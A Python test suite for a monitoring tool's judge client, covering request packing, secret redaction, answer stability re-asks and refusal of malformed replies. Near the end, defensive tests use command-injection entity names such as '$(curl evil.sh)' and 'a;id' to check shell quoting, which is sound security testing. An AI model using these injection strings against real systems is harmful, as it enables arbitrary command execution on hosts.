"""The judge, against a fake transport; its real client, against a loopback server started here.

The last test is the live seam: it talks to the real judge only when `NEONWATCH_LIVE_JUDGE` is set.
"""

from __future__ import annotations

import asyncio
import dataclasses
import json
import math
import os
import shlex
import threading
from collections.abc import Callable
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any

import pytest

from neonwatch import judge as judge_module
from neonwatch.config import Config, JudgeServer
from neonwatch.judge import Judge, JudgeHealth, TransportError, urllib_transport
from neonwatch.questions import (
    AnswerKind,
    ContextKind,
    Meaning,
    Outcome,
    Question,
    bank_for,
    refuse_mutating,
)
from neonwatch.redact import MASK
from neonwatch.schema import Attestation, Context, Severity

# --- helpers -------------------------------------------------------------------------------------


def config(**server: Any) -> Config:
    return Config(judge=dataclasses.replace(JudgeServer(), **server))


#: A processes state carrying every path the processes bank needs, so the whole bank is asked.
PROCESS_STATE = {"processes": {"zombies": 0, "uninterruptible": 0, "from_tmp": [],
                               "top_cpu": [{"pid": 1, "cpu_pct": 0.1}]}}


def context(kind: str = "processes", state: dict[str, Any] | None = None, *, id: str = "c1",
            entity: str = "", domain: str = "") -> Context:
    return Context(id=id, kind=kind, domain=domain or kind, entity=entity,
                   state=state if state is not None else PROCESS_STATE)


def correct(wire: dict[str, Any], pick: Any = None) -> dict[str, Any]:
    """A well-formed answer to one wire question. `pick` is p, an option id, or a level index."""
    criteria = wire["criteria"]
    if wire["type"] == "noul":
        return {"type": "noul", "noul": 0.1 if pick is None else pick}
    if wire["type"] == "choice":
        ids = list(criteria)
        choice = ids[0] if pick is None else pick
        rest = (0.1 / (len(ids) - 1)) if len(ids) > 1 else 0.0
        probs = {i: (0.9 if i == choice else rest) if len(ids) > 1 else 1.0 for i in ids}
        return {"type": "choice", "choice": choice, "probabilities": probs, "confidence": 0.9}
    level = 0 if pick is None else pick
    probs = {str(i): (1.0 if i == level else 0.0) for i in range(len(criteria))}
    return {"type": "score", "score": level, "probabilities": probs, "confidence": 0.8}


Responder = Callable[[str, dict[str, Any], dict[str, Any]], Any]


class Fake:
    """Records every body, and answers each question with `respond(id, wire, body)`."""

    def __init__(self, respond: Responder | None = None, delay: float = 0.0) -> None:
        self.bodies: list[dict[str, Any]] = []
        self.respond = respond or (lambda id, wire, body: correct(wire))
        self.delay = delay
        self.in_flight = 0
        self.peak = 0

    async def __call__(self, body: dict[str, Any]) -> dict[str, Any]:
        self.bodies.append(json.loads(json.dumps(body)))
        self.in_flight += 1
        self.peak = max(self.peak, self.in_flight)
        try:
            await asyncio.sleep(self.delay)
        finally:
            self.in_flight -= 1
        answers = {id: self.respond(id, wire, body) for id, wire in body["questions"].items()}
        return {"model": "/models/judge", "answers": {k: v for k, v in answers.items()
                                                      if v is not None},
                "usage": {"input_tokens": 1}, "latency_s": 0.01}


def ids(bodies: list[dict[str, Any]]) -> list[str]:
    return [id for body in bodies for id in body["questions"]]


def reversed_bodies(fake: Fake) -> list[dict[str, Any]]:
    """Bodies whose noul criteria are swapped, i.e. the re-asks."""
    out = []
    for body in fake.bodies:
        nouls = [w for w in body["questions"].values() if w["type"] == "noul"]
        if nouls and nouls[0]["criteria"] == judge_module.NOUL_REVERSED:
            out.append(body)
    return out


def request_chars(body: dict[str, Any]) -> int:
    state = body["state"]
    chars = len(state) if isinstance(state, str) else len(judge_module.dumps(state))
    return chars + len(judge_module.dumps(body["questions"]))


def by_question(attestations: tuple[Attestation, ...]) -> dict[str, Attestation]:
    return {a.question: a for a in attestations}


PROCESSES = bank_for(ContextKind.PROCESSES)


# --- packing -------------------------------------------------------------------------------------


async def test_a_retargeted_judge_asks_the_new_server_and_its_health_starts_over() -> None:
    old, new = Fake(), Fake()
    judge = Judge(old, config())
    await judge.attest([context()])
    assert judge.health().reachable is True and judge.health().p50_ms is not None
    judge.retarget(new, dataclasses.replace(JudgeServer(), model="judge-2"))
    assert judge.health().reachable is None and judge.health().p50_ms is None
    await judge.attest([context()])
    assert len(old.bodies) == 1 and {b["model"] for b in new.bodies} == {"judge-2"}


async def test_one_context_packs_into_one_request_when_it_fits() -> None:
    fake = Fake()
    out = await Judge(fake, config()).attest([context()])
    assert len(fake.bodies) == 1
    body = fake.bodies[0]
    assert set(body) == {"model", "state", "questions"}
    assert body["model"] == "judge"
    assert list(body["questions"]) == [q.id for q in PROCESSES]
    assert [a.question for a in out] == [q.id for q in PROCESSES]


async def test_the_wire_shape_of_each_question_kind() -> None:
    fake = Fake()
    await Judge(fake, config()).attest([context()])
    wires = fake.bodies[0]["questions"]
    by_id = {q.id: q for q in PROCESSES}
    for id, wire in wires.items():
        q = by_id[id]
        assert set(wire) == {"type", "instructions", "criteria"}
        assert wire["type"] == q.kind.value and wire["instructions"] == q.instructions
        if q.kind.value == "noul":
            assert wire["criteria"] == judge_module.NOUL_CRITERIA
        elif q.kind.value == "choice":
            assert wire["criteria"] == {o.id: o.description for o in q.options}
        else:
            assert wire["criteria"] == list(q.levels)


async def test_a_question_whose_evidence_the_state_lacks_is_never_sent() -> None:
    # Asked anyway, it is answered by guesswork, and a guessed yes raises an issue.
    fake = Fake()
    out = await Judge(fake, config()).attest([context(state={"processes": {"zombies": 0}})])
    sent = set(ids(fake.bodies))
    assert sent == {q.id for q in PROCESSES if q.needs in ((), ("processes/zombies",))}
    assert {"zombie_buildup", "action", "urgency", "abnormality"} <= sent
    assert "background_hog" not in sent and {a.question for a in out} == sent


async def test_max_questions_per_request_splits_a_context() -> None:
    fake = Fake()
    out = await Judge(fake, config(max_questions_per_request=4)).attest([context()])
    assert [len(b["questions"]) for b in fake.bodies] == [4, 4, 2]
    assert sorted(ids(fake.bodies)) == sorted(q.id for q in PROCESSES)
    assert len(out) == len(PROCESSES)


async def test_the_character_budget_splits_a_context() -> None:
    fake = Fake()
    budget = 2500
    out = await Judge(fake, config(max_state_chars=budget)).attest([context()])
    assert len(fake.bodies) > 1
    assert all(request_chars(b) <= budget for b in fake.bodies)
    assert sorted(ids(fake.bodies)) == sorted(q.id for q in PROCESSES)
    assert len(out) == len(PROCESSES)
    # As few as the budget allows: no two neighbouring requests could have been merged.
    for left, right in zip(fake.bodies, fake.bodies[1:], strict=False):
        merged = {**left, "questions": {**left["questions"], **right["questions"]}}
        assert request_chars(merged) > budget


async def test_same_inputs_make_the_same_request_bodies() -> None:
    contexts = [context(id=f"c{i}", state={**PROCESS_STATE, "n": i}) for i in range(5)]
    first, second = Fake(), Fake()
    await Judge(first, config(max_questions_per_request=4)).attest(contexts)
    await Judge(second, config(max_questions_per_request=4)).attest(contexts)
    key = judge_module.dumps
    assert sorted(map(key, first.bodies)) == sorted(map(key, second.bodies))
    assert len(first.bodies) == 5 * 3


async def test_state_is_redacted_before_it_is_sent() -> None:
    state = {"top": [{"cmd": "vault server -dev-root-token-id=s3cr3tvalue --password=hunter22"}],
             "api_token": "abcdef123456"}
    fake = Fake()
    await Judge(fake, config()).attest([context(state=state)])
    sent = judge_module.dumps(fake.bodies[0]["state"])
    assert "hunter22" not in sent and "s3cr3tvalue" not in sent and "abcdef123456" not in sent
    assert MASK in sent
    assert state["api_token"] == "abcdef123456"  # the caller's context is not changed


async def test_an_oversized_state_is_truncated_with_a_visible_marker() -> None:
    budget = 8000
    state = {"lines": [f"line {i} " + "x" * 50 for i in range(2000)]}
    first, second = Fake(), Fake()
    await Judge(first, config(max_state_chars=budget)).attest([context(state=state)])
    await Judge(second, config(max_state_chars=budget)).attest([context(state=state)])
    sent = first.bodies[0]["state"]
    assert isinstance(sent, str)
    assert "[truncated by neonwatch" in sent and sent.endswith("]")
    assert str(len(judge_module.dumps(state))) in sent  # says how much there was
    assert sent.startswith(judge_module.dumps(state)[:100])
    assert all(request_chars(b) <= budget for b in first.bodies)
    assert all(b["state"] == sent for b in first.bodies)
    assert first.bodies == second.bodies


async def test_a_tiny_budget_still_sends_every_question_one_at_a_time() -> None:
    fake = Fake()
    out = await Judge(fake, config(max_state_chars=10)).attest([context()])
    assert [len(b["questions"]) for b in fake.bodies] == [1] * len(PROCESSES)
    assert all(b["state"] == fake.bodies[0]["state"] for b in fake.bodies)
    assert "[truncated by neonwatch" in fake.bodies[0]["state"]
    assert len(out) == len(PROCESSES)


async def test_no_contexts_sends_nothing() -> None:
    fake = Fake()
    assert await Judge(fake, config()).attest([]) == ()
    assert fake.bodies == []


async def test_an_unknown_context_kind_is_refused_before_anything_is_sent() -> None:
    fake = Fake()
    with pytest.raises(ValueError):
        await Judge(fake, config()).attest([context(), context(kind="nonsense")])
    assert fake.bodies == []


# --- concurrency ---------------------------------------------------------------------------------


async def test_requests_for_all_contexts_run_concurrently_up_to_the_bound() -> None:
    fake = Fake(delay=0.02)
    contexts = [context(id=f"c{i}") for i in range(10)]
    out = await Judge(fake, config(concurrency=3, max_questions_per_request=4)).attest(contexts)
    assert len(fake.bodies) == 30
    assert fake.peak == 3
    assert len(out) == 10 * len(PROCESSES)


async def test_below_the_bound_every_request_is_in_flight_at_once() -> None:
    fake = Fake(delay=0.02)
    contexts = [context(id=f"c{i}") for i in range(5)]
    await Judge(fake, config(concurrency=16)).attest(contexts)
    assert fake.peak == 5


async def test_health_reports_what_is_in_flight() -> None:
    seen: list[int] = []
    judge: Judge

    async def post(body: dict[str, Any]) -> dict[str, Any]:
        await asyncio.sleep(0.01)
        seen.append(judge.health().in_flight)
        return await Fake()(body)

    judge = Judge(post, config(concurrency=2, max_questions_per_request=5))
    await judge.attest([context()])
    assert max(seen) == 2
    assert judge.health().in_flight == 0


# --- stability -----------------------------------------------------------------------------------


def warn_on(targets: dict[str, Any], reask: dict[str, Any] | None = None) -> Responder:
    """First asks answer `targets[id]`; re-asks answer `reask[id]` (in the re-ask's orientation)."""

    seen: set[tuple[str, str]] = set()

    def respond(id: str, wire: dict[str, Any], body: dict[str, Any]) -> Any:
        key = (judge_module.dumps(body["state"]), id)
        table = (reask or {}) if key in seen else targets
        seen.add(key)
        return correct(wire, table.get(id))

    return respond


async def test_nothing_is_reasked_below_warn() -> None:
    fake = Fake()  # nouls at 0.1, choices on their first option, scores at level 0
    out = await Judge(fake, config()).attest([context()])
    assert len(fake.bodies) == 1
    assert all(a.stable is None for a in out)
    assert all(a.severity.rank < Severity.WARN.rank for a in out)


async def test_an_answer_at_watch_is_not_reasked() -> None:
    fake = Fake(warn_on({"action": "watch", "urgency": 2}))  # WATCH on both; neither reaches WARN
    out = by_question(await Judge(fake, config()).attest([context()]))
    assert out["action"].severity is Severity.WATCH and out["urgency"].severity is Severity.WATCH
    assert len(fake.bodies) == 1
    assert out["action"].stable is None and out["urgency"].stable is None


async def test_a_noul_at_warn_is_reasked_with_criteria_swapped_and_p_inverted() -> None:
    # masquerade: warn at 0.6. First p = 0.9 (WARN+); the re-ask says 0.2, which is 0.8 read back.
    fake = Fake(warn_on({"masquerade": 0.9}, {"masquerade": 0.2}))
    out = by_question(await Judge(fake, config()).attest([context()]))
    reasks = reversed_bodies(fake)
    assert len(reasks) == 1
    assert list(reasks[0]["questions"]) == ["masquerade"]
    assert reasks[0]["questions"]["masquerade"]["criteria"] == {"true": "no", "false": "yes"}
    assert reasks[0]["state"] == fake.bodies[0]["state"]
    assert out["masquerade"].stable is True
    assert out["masquerade"].answer == {"type": "noul", "noul": 0.9}  # the first, raw
    assert out["masquerade"].severity.rank >= Severity.WARN.rank
    assert all(a.stable is None for q, a in out.items() if q != "masquerade")


async def test_a_noul_that_flips_on_the_reask_is_unstable() -> None:
    # The re-ask says 0.9 in the swapped orientation: 0.1 read back, a different band.
    fake = Fake(warn_on({"masquerade": 0.9}, {"masquerade": 0.9}))
    out = by_question(await Judge(fake, config()).attest([context()]))
    assert out["masquerade"].stable is False
    assert out["masquerade"].severity.rank >= Severity.WARN.rank  # the first answer stands


async def test_a_choice_is_reasked_with_its_options_reversed() -> None:
    fake = Fake(warn_on({"action": "act_now"}, {"action": "act_now"}))
    out = by_question(await Judge(fake, config()).attest([context()]))
    first = fake.bodies[0]["questions"]["action"]["criteria"]
    reasks = [b for b in fake.bodies[1:] if "action" in b["questions"]]
    assert len(reasks) == 1
    assert list(reasks[0]["questions"]["action"]["criteria"]) == list(reversed(list(first)))
    assert reasks[0]["questions"]["action"]["criteria"] == first  # same descriptions
    assert out["action"].stable is True
    assert out["action"].severity is Severity.CRITICAL


async def test_a_choice_that_changes_option_on_the_reask_is_unstable() -> None:
    fake = Fake(warn_on({"action": "act_now"}, {"action": "investigate"}))
    out = by_question(await Judge(fake, config()).attest([context()]))
    assert out["action"].stable is False


async def test_a_score_is_reasked_with_its_levels_reversed_and_mapped_back() -> None:
    urgency = next(q for q in PROCESSES if q.id == "urgency")
    top = len(urgency.levels) - 1
    # First: the top level. Re-ask with levels reversed: index 0 there is the top level here.
    fake = Fake(warn_on({"urgency": top}, {"urgency": 0}))
    out = by_question(await Judge(fake, config()).attest([context()]))
    reask = next(b for b in fake.bodies[1:] if "urgency" in b["questions"])
    assert reask["questions"]["urgency"]["criteria"] == list(reversed(urgency.levels))
    assert out["urgency"].stable is True
    assert out["urgency"].answer["score"] == top


async def test_a_score_that_moves_on_the_reask_is_unstable() -> None:
    urgency = next(q for q in PROCESSES if q.id == "urgency")
    top = len(urgency.levels) - 1
    # The re-ask also says its own top level, which is level 0 read back.
    fake = Fake(warn_on({"urgency": top}, {"urgency": top}))
    out = by_question(await Judge(fake, config()).attest([context()]))
    assert out["urgency"].stable is False


def score_answer(expected: float, probabilities: list[float]) -> dict[str, Any]:
    argmax = max(range(len(probabilities)), key=probabilities.__getitem__)
    return {"type": "score", "score": argmax, "expected": expected, "confidence": 0.6,
            "probabilities": {str(i): p for i, p in enumerate(probabilities)}}


def scored(first: dict[str, Any], reask: dict[str, Any]) -> Responder:
    seen: set[str] = set()

    def respond(id: str, wire: dict[str, Any], body: dict[str, Any]) -> Any:
        if id != "urgency":
            return correct(wire)
        answer = reask if id in seen else first
        seen.add(id)
        return answer

    return respond


async def test_a_score_on_a_band_edge_that_barely_moves_is_stable() -> None:
    # Measured live: urgency 3.48 (WARN, CRITICAL is 3.5); the reversed re-ask said 0.406,
    # which is 3.594 read back (CRITICAL). A 0.114-level move is not instability.
    fake = Fake(scored(score_answer(3.48, [0.01, 0.02, 0.08, 0.26, 0.63]),
                       score_answer(0.406, [0.77, 0.12, 0.07, 0.03, 0.01])))
    out = by_question(await Judge(fake, config()).attest([context()]))
    assert out["urgency"].severity is Severity.WARN
    assert out["urgency"].stable is True


async def test_a_score_that_moves_far_across_a_band_is_unstable() -> None:
    # 3.6 (CRITICAL) first; the re-ask's 2.0 reads back as 2.0 (WATCH): 1.6 levels and a band.
    fake = Fake(scored(score_answer(3.6, [0.0, 0.05, 0.1, 0.1, 0.75]),
                       score_answer(2.0, [0.1, 0.1, 0.6, 0.1, 0.1])))
    out = by_question(await Judge(fake, config()).attest([context()]))
    assert out["urgency"].severity is Severity.CRITICAL
    assert out["urgency"].stable is False


async def test_a_score_that_moves_far_within_its_band_is_stable() -> None:
    # 2.6 and 3.4 are both WARN (2.5 <= s < 3.5): 0.8 levels apart, same band.
    fake = Fake(scored(score_answer(2.6, [0.0, 0.1, 0.3, 0.5, 0.1]),
                       score_answer(0.6, [0.4, 0.4, 0.2, 0.0, 0.0])))
    out = by_question(await Judge(fake, config()).attest([context()]))
    assert out["urgency"].stable is True


def test_a_reversed_score_maps_value_and_distribution_back() -> None:
    urgency = next(q for q in PROCESSES if q.id == "urgency")
    raw = {"type": "score", "score": 1, "expected": 0.75,
           "probabilities": {"0": 0.35, "1": 0.55, "2": 0.1, "3": 0.0, "4": 0.0},
           "confidence": 0.55}
    answer = judge_module.parse_answer(urgency, raw, reverse=True)
    assert answer.score == pytest.approx(4 - 0.75)
    assert dict(answer.probabilities) == {"4": 0.35, "3": 0.55, "2": 0.1, "1": 0.0, "0": 0.0}
    forward = judge_module.parse_answer(urgency, raw, reverse=False)
    assert forward.score == 0.75  # the weighted position, not the argmax
    raw_no_expected = {k: v for k, v in raw.items() if k != "expected"}
    assert judge_module.parse_answer(urgency, raw_no_expected, reverse=False).score == 1


async def test_reasks_are_batched_into_as_few_requests_as_possible() -> None:
    stable_ids = [q.id for q in PROCESSES if q.stability_check]
    targets = {}
    for q in PROCESSES:
        if q.id in stable_ids:
            targets[q.id] = (0.99 if q.kind.value == "noul" else
                             "act_now" if q.kind.value == "choice" else len(q.levels) - 1)
    fake = Fake(warn_on(targets, targets))
    contexts = [context(id="a", state={**PROCESS_STATE, "n": 1}),
                context(id="b", state={**PROCESS_STATE, "n": 2})]
    out = await Judge(fake, config()).attest(contexts)
    assert len(fake.bodies) == 4  # one first ask and one re-ask per context
    everything = fake.bodies[0]["questions"].keys()
    reasked = [b for b in fake.bodies if b["questions"].keys() != everything]
    assert len(reasked) == 2
    warned = {a.question for a in out if a.severity.rank >= Severity.WARN.rank and a.context == "a"}
    assert set(reasked[0]["questions"]) == warned
    assert all(a.stable is not None for a in out if a.question in warned)


async def test_a_failed_reask_leaves_stability_unknown() -> None:
    def respond(id: str, wire: dict[str, Any], body: dict[str, Any]) -> Any:
        return correct(wire, 0.9 if id == "masquerade" else None)

    calls = 0

    async def post(body: dict[str, Any]) -> dict[str, Any]:
        nonlocal calls
        calls += 1
        if calls > 1:
            raise TransportError("gone")
        return await Fake(respond)(body)

    judge = Judge(post, config())
    out = by_question(await judge.attest([context()]))
    assert out["masquerade"].stable is None
    assert judge.health().failed_requests == 1


async def test_a_refused_reask_leaves_stability_unknown_and_is_counted() -> None:
    def respond(id: str, wire: dict[str, Any], body: dict[str, Any]) -> Any:
        if wire["type"] == "noul" and wire["criteria"] == judge_module.NOUL_REVERSED:
            return {"type": "noul", "noul": 7}
        return correct(wire, 0.9 if id == "masquerade" else None)

    judge = Judge(Fake(respond), config())
    out = by_question(await judge.attest([context()]))
    assert out["masquerade"].stable is None
    assert judge.health().refused_answers == 1


# --- dynamic options -----------------------------------------------------------------------------

MEMBERS = [
    {"id": "issue:i-1", "domain": "containers", "entity": "container:shopfront-worker-1",
     "at": 100.0, "title": "crash-looping"},
    {"id": "finding:iface.churn@network", "domain": "network", "title": "veth churn"},
    {"id": "issue:i-9", "domain": "processes", "entity": "process:812", "title": "cpu climbing"},
]


async def test_likely_cause_is_filled_from_the_members() -> None:
    fake = Fake(lambda id, wire, body: correct(wire, "m2" if id == "likely_cause" else None))
    out = by_question(await Judge(fake, config()).attest(
        [context("correlation", {"members": MEMBERS})]))
    wire = fake.bodies[0]["questions"]["likely_cause"]
    assert list(wire["criteria"]) == ["m1", "m2", "m3"]
    assert "issue:i-1" in wire["criteria"]["m1"] and "crash-looping" in wire["criteria"]["m1"]
    assert "container:shopfront-worker-1" in wire["criteria"]["m1"]
    assert "veth churn" in wire["criteria"]["m2"]
    assert all(len(d) <= judge_module.MEMBER_SUMMARY_CHARS for d in wire["criteria"].values())
    assert out["likely_cause"].answer["choice"] == "m2"
    assert out["likely_cause"].cause == "likely-cause"


@pytest.mark.parametrize("state", [
    {}, {"members": "not a list"}, {"members": MEMBERS[:1]}, {"members": MEMBERS * 3},
    {"members": [{"id": "a"}, {"domain": "no id"}]}, {"members": [{"id": ""}, {"id": "b"}]},
    {"members": [{"id": "a"}, "not an object"]},
])
async def test_likely_cause_is_skipped_when_the_members_cannot_fill_it(state) -> None:
    fake = Fake()
    out = by_question(await Judge(fake, config()).attest([context("correlation", state)]))
    assert "likely_cause" not in out
    assert "likely_cause" not in ids(fake.bodies)
    assert len(out) == len(bank_for(ContextKind.CORRELATION)) - 1


# --- refusals ------------------------------------------------------------------------------------

NOUL, CHOICE, SCORE = "masquerade", "dominant", "abnormality"


def broken(target: str, answer: Callable[[dict[str, Any]], Any]) -> Responder:
    return lambda id, wire, body: answer(correct(wire)) if id == target else correct(wire)


def with_(key: str, value: Any) -> Callable[[dict[str, Any]], Any]:
    return lambda a: {**a, key: value}


def without(key: str) -> Callable[[dict[str, Any]], Any]:
    return lambda a: {k: v for k, v in a.items() if k != key}


REFUSALS = {
    "not an object": (NOUL, lambda a: [a]),
    "type mismatch": (NOUL, with_("type", "choice")),
    "unknown type": (NOUL, with_("type", "verdict")),
    "noul missing p": (NOUL, without("noul")),
    "noul p a bool": (NOUL, with_("noul", True)),
    "noul p NaN": (NOUL, with_("noul", math.nan)),
    "noul p infinite": (NOUL, with_("noul", math.inf)),
    "noul p above 1": (NOUL, with_("noul", 1.5)),
    "noul p a string": (NOUL, with_("noul", "0.5")),
    "unknown field": (NOUL, with_("explanation", "trust me")),
    "choice outside the options": (CHOICE, with_("choice", "rootkit")),
    "choice not a string": (CHOICE, with_("choice", 1)),
    "distribution missing an option": (
        CHOICE, lambda a: {**a, "probabilities": dict(list(a["probabilities"].items())[:-1])}),
    "distribution with an extra option": (
        CHOICE, lambda a: {**a, "probabilities": {**a["probabilities"], "rootkit": 0.0}}),
    "distribution not summing to 1": (
        CHOICE, lambda a: {**a, "probabilities": {k: v * 0.9 for k, v in
                                                  a["probabilities"].items()}}),
    "distribution not an object": (CHOICE, with_("probabilities", [0.9, 0.1])),
    "a probability a bool": (
        CHOICE, lambda a: {**a, "probabilities": {**a["probabilities"],
                                                  next(iter(a["probabilities"])): True}}),
    "confidence NaN": (CHOICE, with_("confidence", math.nan)),
    "confidence missing": (CHOICE, without("confidence")),
    "score above N-1": (SCORE, with_("score", 5)),
    "score below 0": (SCORE, with_("score", -0.5)),
    "score a bool": (SCORE, with_("score", False)),
    "expected out of range": (SCORE, with_("expected", 4.5)),
    "expected NaN": (SCORE, with_("expected", math.nan)),
    "levels not covered": (
        SCORE, lambda a: {**a, "probabilities": {"0": 1.0, "1": 0.0}}),
    "levels keyed by name": (
        SCORE, lambda a: {**a, "probabilities": {f"l{k}": v for k, v in
                                                 a["probabilities"].items()}}),
    "legend is allowed but a stray key is not": (SCORE, with_("reasoning", "")),
    "missing from the reply": (NOUL, lambda a: None),
}


@pytest.mark.parametrize("target, mutate", list(REFUSALS.values()), ids=list(REFUSALS))
async def test_a_malformed_answer_is_refused_and_never_becomes_a_guess(target, mutate) -> None:
    judge = Judge(Fake(broken(target, mutate)), config())
    out = by_question(await judge.attest([context()]))
    assert target not in out
    assert len(out) == len(PROCESSES) - 1
    health = judge.health()
    assert health.refused_answers == 1 and health.failed_requests == 0


async def test_the_fields_judge_actually_sends_are_accepted() -> None:
    # Measured on the live server (version 1.2): extra keys beside the ones the contract names.
    def respond(id: str, wire: dict[str, Any], body: dict[str, Any]) -> Any:
        a = correct(wire)
        if wire["type"] == "noul":
            return {**a, "probability": a["noul"], "value": False, "confidence": 0.9}
        if wire["type"] == "score":
            return {**a, "expected": 0.2, "legend": {"0": "x"}}
        return a

    judge = Judge(Fake(respond), config())
    assert len(await judge.attest([context()])) == len(PROCESSES)
    assert judge.health().refused_answers == 0


def test_a_distribution_within_the_tolerance_is_accepted() -> None:
    dominant = next(q for q in PROCESSES if q.id == CHOICE)
    wire = judge_module.wire(dominant, reverse=False)
    raw = correct(wire)
    raw["probabilities"] = {k: v * 1.019 for k, v in raw["probabilities"].items()}
    assert judge_module.parse_answer(dominant, raw, reverse=False).choice == raw["choice"]


# --- failures ------------------------------------------------------------------------------------


def failing(error: BaseException | None = None, reply: Any = None) -> Callable[..., Any]:
    async def post(body: dict[str, Any]) -> Any:
        if error is not None:
            raise error
        return reply

    return post


@pytest.mark.parametrize("post, reachable", [
    (failing(TransportError("connection refused")), False),
    (failing(OSError("reset")), False),
    (failing(reply=["not", "an", "object"]), True),
    (failing(reply={"answers": []}), True),
    (failing(reply={"no_answers": {}}), True),
    (failing(reply={"answers": {}, "surprise": 1}), True),
], ids=["transport", "os", "not-object", "answers-not-object", "no-answers", "unknown-field"])
async def test_a_failed_request_yields_nothing_and_is_counted(post, reachable) -> None:
    judge = Judge(post, config(max_questions_per_request=4))
    assert await judge.attest([context()]) == ()
    health = judge.health()
    assert health.failed_requests == 3 and health.requests == 3
    assert health.refused_answers == 0
    assert health.reachable is reachable
    assert health.last_error


async def test_a_reply_answering_a_question_nobody_asked_fails_the_request() -> None:
    async def post(body: dict[str, Any]) -> dict[str, Any]:
        reply = await Fake()(body)
        reply["answers"]["injected"] = {"type": "noul", "noul": 1.0}
        return reply

    judge = Judge(post, config())
    assert await judge.attest([context()]) == ()
    assert judge.health().failed_requests == 1
    assert "injected" in judge.health().last_error


async def test_a_request_that_times_out_is_counted_and_the_rest_still_answer() -> None:
    async def post(body: dict[str, Any]) -> dict[str, Any]:
        if "zombie_buildup" in body["questions"]:
            await asyncio.sleep(5)
        return await Fake()(body)

    judge = Judge(post, config(max_questions_per_request=4, timeout_s=0.05))
    out = await judge.attest([context()])
    assert len(out) == len(PROCESSES) - 4
    health = judge.health()
    assert health.failed_requests == 1 and health.requests == 3
    assert "timed out" in health.last_error
    assert health.in_flight == 0


# --- attestations --------------------------------------------------------------------------------


async def test_attestations_carry_the_context_the_reading_and_the_raw_answer() -> None:
    fake = Fake(warn_on({"action": "act_now"}, {"action": "act_now"}))
    ctx = context("process", {"pid": 4242, "cmd": "xmrig"}, id="ctx-9", entity="process:4242",
                  domain="processes")
    out = by_question(await Judge(fake, config()).attest([ctx]))
    action = out["action"]
    assert (action.context, action.context_kind, action.domain, action.entity) == (
        "ctx-9", "process", "processes", "process:4242")
    question = next(q for q in bank_for(ContextKind.PROCESS) if q.id == "action")
    assert action.instructions == question.instructions
    assert action.answer == correct(judge_module.wire(question, reverse=False), "act_now")
    assert action.severity is Severity.CRITICAL and action.cause == "act-now"
    assert action.confidence == 0.9
    assert isinstance(action.latency_ms, int) and action.latency_ms >= 0
    assert "{entity}" not in action.next_step and "4242" in action.next_step
    assert "process:4242" not in action.next_step


@pytest.mark.parametrize("entity", ["4242", "process:4242"])
async def test_entity_is_filled_bare_in_every_next_step(entity) -> None:
    targets = {q.id: (0.99 if q.kind.value == "noul" else "act_now" if q.kind.value == "choice"
                      else len(q.levels) - 1)
               for q in bank_for(ContextKind.PROCESS) if q.stability_check}
    fake = Fake(warn_on(targets, targets))
    out = await Judge(fake, config()).attest([context("process", {"pid": 4242}, entity=entity)])
    steps = [a.next_step for a in out if "4242" in a.next_step]
    assert steps
    assert all("{entity}" not in a.next_step and "process:" not in a.next_step for a in out)


def loudest(kind: ContextKind) -> dict[str, Any]:
    """The most concerning answer to every question of a kind, so every next step is reached."""
    return {q.id: (0.99 if q.kind.value == "noul" else q.options[-1].id if q.kind.value ==
                   "choice" else len(q.levels) - 1) for q in bank_for(kind)}


@pytest.mark.parametrize("kind, entity, bare", [
    ("gpu_device", "gpu:0", "0"),
    ("log_burst", "unit:openvpn.service", "openvpn.service"),
    ("container", "container:shopfront-worker-1", "shopfront-worker-1"),
    ("listener", "listener:tcp/6379", "tcp/6379"),
    ("process", "process:4242", "4242"),
])
async def test_entity_is_filled_after_its_first_colon_whatever_the_kind(kind, entity,
                                                                       bare) -> None:
    targets = loudest(ContextKind(kind))
    fake = Fake(warn_on(targets, targets))
    out = await Judge(fake, config()).attest([context(kind, {"n": 1}, entity=entity)])
    filled = [a.next_step for a in out if bare in a.next_step]
    assert filled, f"no next step of {kind} names {bare!r}"
    assert all(entity not in a.next_step and "{entity}" not in a.next_step for a in out)
    assert all(a.entity == entity for a in out)  # the attestation keeps the full name


async def attest_loudly(kind: str, entity: str) -> tuple[Judge, tuple[Attestation, ...]]:
    targets = loudest(ContextKind(kind))
    judge = Judge(Fake(warn_on(targets, targets)), config())
    return judge, await judge.attest([context(kind, {"n": 1}, entity=entity)])


def templates(kind: str) -> dict[str, str]:
    """Question id -> its loudest outcome's next step, unfilled."""
    return {q.id: q.meaning.outcomes[-1].next_step for q in bank_for(ContextKind(kind))}


async def test_a_hostile_syslog_identifier_never_reaches_the_dashboard() -> None:
    # A syslog identifier `x; id #` rendered `journalctl -t x; id # --since=-1h ...`.
    for entity in ("log_burst:x; id #", "log:x; id #"):
        judge, out = await attest_loudly("log_burst", entity)
        assert all("id #" not in a.next_step for a in out)
        dropped = [a for a in out if "{entity}" in templates("log_burst")[a.question]]
        assert dropped and all(a.next_step == "" for a in dropped)
        assert all(a.cause for a in dropped if a.severity.rank >= Severity.WATCH.rank)
        assert judge.health().refused_steps == len(dropped)


@pytest.mark.parametrize("name", ["$(curl evil.sh)", "`id`", "a;id", "a\nid", "a b|cat",
                                  "--vacuum-size=1", "x' ; id '"])
@pytest.mark.parametrize("kind, prefix", [("log_burst", "log:"), ("unit", "unit:"),
                                          ("container", "container:"), ("process", "process:")])
async def test_a_hostile_entity_stays_one_quoted_word_or_the_step_is_dropped(
        kind, prefix, name) -> None:
    judge, out = await attest_loudly(kind, prefix + name)
    steps = templates(kind)
    for a in out:
        template = steps[a.question]
        if "{entity}" not in template or not a.next_step:
            continue
        # Kept: the entity is exactly one shell word, where a harmless name would be.
        assert a.next_step == template.replace("{entity}", shlex.quote(name))
        assert len(shlex.split(a.next_step)) == len(shlex.split(template.replace("{entity}",
                                                                                 "X")))
        assert refuse_mutating(a.next_step) == ""
    refused = judge.health().refused_steps
    assert refused == sum(1 for a in out if "{entity}" in steps[a.question] and not a.next_step)


#: A step that quotes the placeholder, as the process bank's `network_mismatch` did before it
#: left the bank for want of evidence (2026-10-28).
QUOTED = Question("quoted", AnswerKind.NOUL, "Does it hold sockets?", (), (), Meaning(
    thresholds=((0.5, Outcome(Severity.WATCH, "quoted", "sudo ss -tunap | grep -F "
                                                       "'pid={entity},'")),)), False)


async def attest_quoted(monkeypatch, entity: str) -> tuple[Judge, tuple[Attestation, ...]]:
    monkeypatch.setattr(judge_module, "bank_for", lambda kind: (QUOTED,))
    judge = Judge(Fake(warn_on({"quoted": 0.99})), config())
    return judge, await judge.attest([context("process", {"n": 1}, entity=entity)])


